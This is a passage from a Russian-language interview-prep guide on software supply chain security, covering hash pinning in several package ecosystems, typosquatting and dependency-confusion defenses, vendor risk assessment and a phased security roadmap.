- **Обнаружение подмены:** если атакующий переопубликует пакет с вредоносным кодом, хеш не совпадёт
- **Воспроизводимость:** всегда ставятся ровно те же байты

**В разных экосистемах:**

**npm:**
- `package-lock.json` автоматически (npm 5+)
- `npm ci` принудительно использует lockfile

**Python (pip):**
```
requirements.txt
  lodash==4.17.21 \
    --hash=sha256:abc123...
```
- `pip-compile --generate-hashes`
- `pip install --require-hashes -r requirements.txt`

**Go:**
- `go.sum` — автоматические хеши всех deps
- `GOFLAGS=-mod=readonly` падает, если что-то изменилось

**Docker:**
```dockerfile
FROM ubuntu@sha256:abc123...  # pin by digest, not tag
```

**Java (Maven):**
- Нативного hash pin нет; использовать **Maven Enforcer Plugin** с проверкой хешей
- Или **Gradle** dependency locking

**Риск без hash pins:**
- Атаки подмены зависимостей
- Скомпрометированные зеркала / кеши
- «Правильная версия, неправильные байты»

## Q22. (!) Как защититься от typosquatting?

**Typosquatting** — атакующий публикует пакет с именем, похожим на популярное: `electorn` vs `electron`, `reqeusts` vs `requests`.

**Защита:**

**1. Внутренний реестр пакетов:**
- Приватное зеркало npm/PyPI
- Разрешены только проверенные пакеты
- `npm install X` у разработчика → сначала идёт во внутренний

**2. Allowlists:**
- CI блокирует установку неодобренных пакетов
- `package.json` проходит ревью в PR

**3. Scoped-пакеты:**
- `@myorg/mylib` — scope зарезервирован (предотвращает путаницу)

**4. Сканирование коммитов на новые deps:**
- Добавлена новая зависимость → SCA-ревью перед merge
- Socket.dev / Deps.dev — подсвечивают подозрительные пакеты

**5. Отложенный апгрейд:**
- Не обновляться автоматически на совсем новые пакеты (моложе 7 дней)
- Даёт сообществу время выявить вредонос

**6. Ручное ревью критичных deps:**
- Топ-N зависимостей (логирование, крипто, веб-фреймворк) — ревьюить сами исходники

**7. Мониторинг typosquat-ов:**
- Сервисы вроде `package-name-checker`
- Проактивно регистрировать частые опечатки имён своих же пакетов

**8. Предотвращение dependency confusion:**
- Регистрировать имена приватных пакетов в **публичном реестре**, чтобы их не заняли
- Настроить пакетный менеджер на приоритет внутреннего реестра

**9. Закреплённые зависимости (q21):**
- Массовая подмена версий — обнаруживается по несовпадению хеша

**Реальные пойманные примеры:**
- Пакет `colors` (2022) — самосаботаж мейнтейнера; пойман уже после ущерба
- Массовый typosquat в PyPI (сотни пакетов) — автоматически обнаружен PyPI

## Q23. (!) Vendor risk assessment?

**При онбординге стороннего ПО / SaaS:**

**Вопросы:**

**Состояние безопасности:**
- Есть сертификация SOC 2 Type II / ISO 27001?
- Доступны отчёты по пентестам?
- Есть план реагирования на инциденты?
- История утечек данных?

**Обработка данных:**
- Где хранятся данные (регион, юрисдикция)?
- Шифрование at rest / in transit?
- Политики хранения / удаления данных?
- Соответствие GDPR, CCPA?

**Доступ и аутентификация:**
- Поддержка SSO / SAML / OIDC?
- Принудительный MFA?
- RBAC / least-privilege?
- Журналы аудита?

**Цепочка поставок:**
- Раскрыты ли субподрядчики (sub-processors)?
- Практики безопасности по зависимостям?
- Доступен ли SBOM?

**Операционка:**
- SLA / uptime?
- Status-страница / коммуникация по инцидентам?
- Бэкап и восстановление?

**Инструменты:**
- **Whistic**, **OneTrust** — платформы управления вендорами
- **Опросники по безопасности** (SIG Lite, CAIQ)
- **OpenFINT, Trust-центры** — опубликованные вендором свидетельства

**На постоянной основе:**
- Ежегодная переоценка
- Мониторинг утечек (новости, HIBP)
- Контрольная точка при продлении

**Критичные вендоры:**
- **Tier 1** (провайдер аутентификации, облако) — высокий контроль
- **Tier 2** (CMS, аналитика) — средний
- **Tier 3** (вспомогательные инструменты) — базовый

**Бюджет:** ревью безопасности для Tier 1 занимает **недели** — начинайте заранее.

## Q24. Supply chain security roadmap?

**Прагматичный порядок внедрения:**

**Фаза 1 — Видимость (недели):**
1. Включить Dependabot на всех репозиториях
2. Генерировать SBOM в CI (Syft) — загружать как артефакт
3. Сканировать контейнеры через Trivy в CI
4. GitHub code scanning (Semgrep, CodeQL)

**Фаза 2 — Усиление сборки (1–2 месяца):**
5. Привязать actions к commit SHA
6. Минимальные права `GITHUB_TOKEN`
7. OIDC к облаку (заменить долгоживущие учётки)
8. Защита веток + обязательные ревью
9. Подписанные коммиты (gitsign)

**Фаза 3 — Attestations (месяцы):**
10. Подписывать артефакты через Cosign (keyless)
11. SLSA L3 provenance (slsa-github-generator)
12. SBOM-attestation на артефактах
13. Attestation сканирования уязвимостей

**Фаза 4 — Принуждение (кварталы):**
14. Admission controller (Kyverno) проверяет подписи
15. Политика: деплоятся только подписанные образы
16. Обязательные attestations SBOM + provenance
17. Формализованный процесс vendor risk

**Фаза 5 — Продвинутое (постоянно):**
18. Пилот воспроизводимых сборок
19. Герметичные сборки (Bazel) для критичных сервисов
20. VEX-утверждения для известных ложных срабатываний
21. Red team: симуляция supply chain attack

**Метрики:**
- % репозиториев с Dependabot
- % подписанных артефактов
- Среднее время до патча CVE
- Кол-во заблокированных неодобренных пакетов

**Ловушка:** разрастание инструментов. Начните с 2–3 хорошо интегрированных, затем расширяйте.

---

## See also

- [Zero Trust](zero-trust-interview.md) — комплементарная security модель
- [mTLS](mtls-interview.md) — service-to-service trust основа
- [Secrets Management](secrets-management-interview.md) — protection of signing keys и CI creds
- [OWASP Top 10](owasp-top10-interview.md) — A06 Vulnerable & Outdated Components
- [Application Security](application-security-interview.md) — общая картина AppSec
- [CI/CD Pipeline Design](../cicd/pipeline-design-interview.md) — где security controls встраиваются
- [Deployment Strategies](../cicd/deployment-strategies-interview.md) — admission controllers для signed artifacts
- [Kubernetes](../devops/kubernetes-interview.md) — admission, pod security, image verification
- [Docker](../devops/docker-interview.md) — image signing, scanning
- [Observability](../monitoring/observability-interview.md) — auditing supply chain events

- [Application Security](application-security-interview.md)
- [Authentication and Authorization Patterns](authentication-authorization-patterns-interview.md)
- [JWT](jwt-interview.md)
- [mTLS (Mutual TLS)](mtls-interview.md)
- [OAuth2](oauth2-interview.md)
- [OWASP Top 10](owasp-top10-interview.md)
